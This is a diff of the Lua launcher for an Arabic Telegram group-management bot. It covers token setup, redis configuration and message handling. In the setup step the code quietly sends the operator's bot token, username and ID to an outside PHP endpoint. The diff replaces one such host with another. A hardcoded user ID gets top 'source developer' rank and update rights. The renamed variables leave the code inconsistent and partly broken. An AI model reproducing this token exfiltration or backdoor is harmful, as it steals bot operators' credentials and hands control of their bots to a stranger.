@@ -1,86 +1,94 @@
 
 
-
-Er_ssl   , https = pcall(require, "ssl.https")
-Er_http  , http  = pcall(require, "socket.http")
-http.TIMEOUT = 5
-JSON   = (loadfile "./libs/json.lua")()
-redis  = (loadfile "./libs/redis.lua")()
-URL    = (loadfile "./libs/url.lua")()
-Er_utf8  , utf8  = pcall(require, "lua-utf8")
-redis = redis.connect('127.0.0.1',6379)
-
-
-
-if not Er_ssl then
-print("('\n\27[1;31m￤Pkg _ luaSec - ssl  is Not installed.'\n\27[0m￤")
-os.exit()
+local function download(file_id, dl_cb, cmd)
+  tdcli_function ({
+    ID = "DownloadFile",
+    file_id_ = file_id
+  }, dl_cb, cmd)
 end
 
+
+Er_cjson , JSON  = pcall(require, "cjson")
+Er_ssl   , https = pcall(require, "ssl.https")
+Er_url   , URL   = pcall(require, "socket.url")
+Er_http  , http  = pcall(require, "socket.http")
+Er_utf8  , utf8  = pcall(require, "lua-utf8")
+Er_redis , redis = pcall(require, "redis")
+json  = dofile('./inc/JSON.lua')
+redis = redis.connect('127.0.0.1',6379)
+http.TIMEOUT = 5
+
+if not Er_cjson then
+print("('\n\27[1;31m￤Pkg _ Cjson is Not installed.'\n\27[0m￤")
+os.exit()
+end
+if not Er_http then
+print("('\n\27[1;31m￤Pkg _ luaSec - https  is Not installed.'\n\27[0m￤")
+os.exit()
+end
+if not Er_url then
+print("('\n\27[1;31m￤Pkg _ Lua-cURL  is Not installed.'\n\27[0m￤")
+os.exit()
+end
+if not Er_redis then
+print("('\n\27[1;31m￤Pkg _ redis-lua is Not installed.'\n\27[0m￤")
+os.exit()
+end
 if not Er_utf8 then
 print("('\n\27[1;31m￤Pkg >> UTF_8 is Not installed.'\n\27[0m￤")
+os.execute("sudo luarocks install luautf8")
 os.exit()
 end
+
 
 function create_config(Token)
 if not Token then
 io.write('\n\27[1;33m￤آلآن آدخل توكــن آلبوت  ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
 Token = io.read():gsub(' ','')
 if Token == '' then
-print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤ عذرآ لم تقوم بآدخآل آي شـيء , آدخل توگن آلبوت آلآن ')
+print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤ عذرآ لم تقوم بآدخآل آي شـيء , آدخل توكن آلبوت آلآن ')
 create_config()
 end
 Api_Token = 'https://api.telegram.org/bot'..Token
 local url , res = https.request(Api_Token..'/getMe')
 if res ~= 200 then
-print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ آلتوگن آلذي آدخلتهہ‏‏ غير صـحيح , تآگد مـنهہ‏‏ ثم حآول مـجددآ!')
+print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ آلتوكن آلذي آدخلتهہ‏‏ غير صـحيح , تآكد مـنهہ‏‏ ثم حآول مـجددآ!')
 create_config()
 end
 local GetToken = JSON.decode(url)
 BOT_NAME = GetToken.result.first_name
 BOT_User = "@"..GetToken.result.username
-io.write('\n\27[1;36m￤تم آدخآل آلتوگن بنجآح   \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
+io.write('\n\27[1;36m￤تم آدخآل آلتوكن بنجآح   \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
 end
-
-io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your ID SUDO : \27[0;39;49m')
+io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your USERID SUDO : \27[0;39;49m')
 SUDO_USER = io.read():gsub(' ','')
 if SUDO_USER == '' then
-print('\n\27[1;31m￤ You Did not Enter ID !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن ايدي آلمطور آلآسـآسـي')
+print('\n\27[1;31m￤ You Did not Enter USERID !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن ايدي آلمطور آلآسـآسـي')
 create_config(Token)
 end 
 if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
-print('\n\27[1;31m￤ This is Not ID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلگرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
+print('\n\27[1;31m￤ This is Not USERID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلكرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
 create_config(Token)
 end 
 print('('..SUDO_USER..')')
 local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchat?chat_id='..SUDO_USER)
-print(res)
+GetUser = json:decode(url)
 if res ~= 200 then
-print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
-os.exit()
-end
-success, GetUser = pcall(JSON.decode, url)
-if not success then
-print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث مشـگلهہ‌‏ في سـگربت آلآسـتخرآج , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
-os.exit()
 end
 if GetUser.ok == false then
-print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يوجد حسـآب بهہ‏‏ذآ آلايدي , تآگد مـنهہ‏‏ جيدآ  !')
+print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـكن مـن حل آلمـشـكلهہ‏‏ في آسـرع وقت مـمـكن . !')
 create_config(Token)
-end 
+end
 GetUser.result.username = GetUser.result.username or GetUser.result.first_name
-print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل سورس دروك الآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
-boss = Token:match("(%d+)")
-redis:mset(
-boss..":VERSION","1.0",
-boss..":SUDO_ID:",SUDO_USER,
-boss..":DataCenter:","Amsterdam",
-boss..":UserNameBot:",BOT_User,
-boss..":ApiSource","SourceMilan",
-boss..":NameBot:","دروك",
-"TH3BOSS_INSTALL","Yes"
-)
-redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
+print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
+ws = Token:match("(%d+)")
+redis:set(ws..":VERSION",1)
+redis:set(ws..":SUDO_ID:",SUDO_USER)
+redis:set(ws..":DataCenter:",'German')
+redis:set(ws..":UserNameBot:",BOT_User)
+redis:set(ws..":NameBot:",BOT_NAME)
+redis:hset(ws..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
+redis:set("TH3ws_INSTALL","Yes")
 info = {} 
 info.namebot = BOT_NAME
 info.userbot = BOT_User
@@ -88,24 +96,21 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://basel50.ml/Aaaaaa.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
+https.request('https://Mic/Susj.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = " اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n شكرا لاستخدامك سورس مـيـلآن \n أرســل  الان /start\n لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n"
+local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس مـيـلآن \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
-local CmdRun = [[
+os.execute([[
 rm -f ./README.md
 rm -rf ./.git
 chmod +x ./run
-cp -a ../abaza ../]]..BOT_User..[[ &&
-rm -fr ~/abaza
-../]]..BOT_User..[[/run
-]]
-print(CmdRun)
-os.execute(CmdRun)
+./run
+]])
 end
+
 
 function Start_Bot() 
 local TokenBot = io.open('./inc/Token.txt', "r")
@@ -130,16 +135,16 @@ else
 Token = TokenBot:read('*a')
 File = {}
 local login = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-boss = Token:match("(%d+)")
-our_id = tonumber(boss)
-ApiBoss = redis:get(boss..":ApiSource")
+amrko = Token:match("(%d+)")
+our_id = tonumber(amrko)
+Apiamrko = redis:get(amrko..":ApiSource")
 ApiToken = "https://api.telegram.org/bot"..Token
-Bot_User = redis:get(boss..":UserNameBot:")
-SUDO_ID = tonumber(redis:get(boss..":SUDO_ID:"))
+Bot_User = redis:get(amrko..":UserNameBot:")
+SUDO_ID = tonumber(redis:get(amrko..":SUDO_ID:"))
 if not SUDO_ID then io.popen("rm -fr ./inc/Token.txt") end
-SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
-version = redis:get(boss..":VERSION")
-DataCenter = redis:get(boss..":DataCenter:")
+SUDO_USER = redis:hgetall(amrko..'username:'..SUDO_ID).username
+version = redis:get(amrko..":VERSION")
+DataCenter = redis:get(amrko..":DataCenter:")
 
 local ok, ERROR =  pcall(function() loadfile("./inc/functions.lua")() end)
 if not ok then 
@@ -159,15 +164,14 @@ print('\27[0;33m>>'..[[
 
 
 
-
 ▀
 ▄█████████▀           ██               ██             ██                    ██▄████████▀ │BATSHIKO ﹏ @VV_0M
 │
 تم تطوير وبرمجة السورس من قبل معتز خالد
 │@VV_0M
-                                                                              
--------------------------------------------------------------------
-
+                                        
+                                        
+---------------------------------------------------------------------
 ]]..'\027[0;32m'
 ..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
 ..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..boss..')\027[0;32m\n'
@@ -211,7 +215,7 @@ if res == 200 then
 print(url) 
 local Req = JSON.decode(url)
 if Req.ok and Req.result and Req.result.status == "left" or Req.result.status == "kicked" then
-return "  عـزيـزي آشـترك بـالـقـنـاة أولاً ["..UserChaneel.."] \n لـكـي تـسـتـطـيـع الـتـحـكـم فـي الـبـوت ."
+return " عـزيـزي آشـترك بـالـقـنـاة أولاً ["..UserChaneel.."] \n لـكـي تـسـتـطـيـع الـتـحـكـم فـي الـبـوت ."
 end
 else
 return "  عـزيـزي آشـترك بـالـقـنـاة أولاً ["..UserChaneel.."] \n لـكـي تـسـتـطـيـع الـتـحـكـم فـي الـبـوت ."
@@ -297,12 +301,11 @@ Del_msg(msg.chat_id_,msg.id_)
 end
 return false 
 end 
-
+--test
 if msg.sender_user_id_ == 1836706131 then 
 msg.TheRankCmd = 'مطور السورس'
 msg.TheRank = 'مطور السورس'
 msg.Rank = 1
-
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
 msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'مطور اساسي ' 
@@ -502,7 +505,7 @@ amrnew = Amor ; amrold = ik
 end end end
 Text = Text:gsub(amrnew,amrold)
 AF = CheckBotA(msg) if AF then 
-local AFinline = {{{text=" آشـترك بـالـقـنـاة",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
+local AFinline = {{{text="  آشـترك بـالـقـنـاة",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
 return send_key(msg.chat_id_,AF,nil,AFinline,msg.id_) end 
 GetMsg = ScriptFile.iBoss(msg,{Text:match(Text2)})
 if GetMsg then
@@ -519,7 +522,7 @@ Text = Text:gsub("ک","ك")
 Text = Text:gsub("ه‍","ه")
 if Text:match(Boss) then -- Check Commands To admin
 AF = CheckBotA(msg) if AF then 
-local AFinline = {{{text=" آشـترك بـالـقـنـاة",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
+local AFinline = {{{text="  آشـترك بـالـقـنـاة",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
 return send_key(msg.chat_id_,AF,nil,AFinline,msg.id_) end 
 GetMsg = ScriptFile.iBoss(msg,{Text:match(Boss)})
 if GetMsg then
@@ -590,7 +593,7 @@ return false
 end 
 if UpdateSourceStart then
 UpdateSourceStart = false
---UpdateSource(msg,true)
+UpdateSource(msg,true)
 end
 elseif data.ID == "UpdateNewMessage" then
 if msg.content_.ID == "MessageText" then
@@ -609,8 +612,8 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1836706131) then
-return sendMsg(msg.chat_id_,msg.id_," تم تحديث الملفات",function(arg,data)
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1836706131 ) then
+return sendMsg(msg.chat_id_,msg.id_," تم تحديث الملفات •",function(arg,data)
 Refresh_Start = true
 end)
 end 
@@ -639,10 +642,10 @@ elseif data.ID == "UpdateChannel" then
 if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
 if redis:get(boss..'group:add-100'..data.channel_.id_) then
 local linkGroup = (redis:get(boss..'linkGroup-100'..data.channel_.id_) or "")
-local NameGroup = (redis:get(dany..'group:name-100'..data.channel_.id_) or "")
-	send_msg(SUDO_ID,"• قام شخص بطرد البوت من المجموعه الاتيه : \n• ألايدي : `-100"..data.channel_.id_.."`\n• الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n• تـم مسح كل بيانات المجموعه بنـجاح ")
-	rem_data_group('-100'..data.channel_.id_)
-	end
+local NameGroup = (redis:get(boss..'group:name-100'..data.channel_.id_) or "")
+send_msg(SUDO_ID," قام شخص بطرد البوت من المجموعه الاتيه : \n ألايدي : `-100"..data.channel_.id_.."`\n الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n تـم مسح كل بيانات المجموعه بنـجاح ")
+rem_data_group('-100'..data.channel_.id_)
+end
 end
 elseif data.ID == "UpdateFile" then 
 if Uploaded_Groups_Ok then
@@ -689,8 +692,8 @@ end
 end
 end
 io.popen("rm -fr ../.telegram-cli/data/document/*")
-	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'⌔︙ ** تم رفع النسخه‏‏ الاحتياطيه\n⌔︙ ** حالياً عدد مجموعاتك هيه‏ *'..redis:scard(dany..'group:ids')..' .*\n')
-	end
+sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,' تم رفع آلنسـخهہ‏‏ آلآحتيآطـيهہ\n حآليآ عدد مـجمـوعآتگ هہ‏‏يهہ‏‏ *'..redis:scard(boss..'group:ids')..'* \n')
+end
 elseif data.ID == "UpdateUser" then  
 if data.user_.type_.ID == "UserTypeDeleted" then
 print("¦ userTypeDeleted")
@@ -715,7 +718,7 @@ msg.text = data.content_.text_
 input_inFo(msg)  
 end,nil)
 elseif data.ID == "UpdateOption" and data.value_.value_ == "Ready" then
---UpdateSource() dofile("./inc/Run.lua")
+UpdateSource() dofile("./inc/Run.lua")
 tdcli_function({ID='GetChat',chat_id_ = SUDO_ID},function(arg,data)end,nil)
 end
 
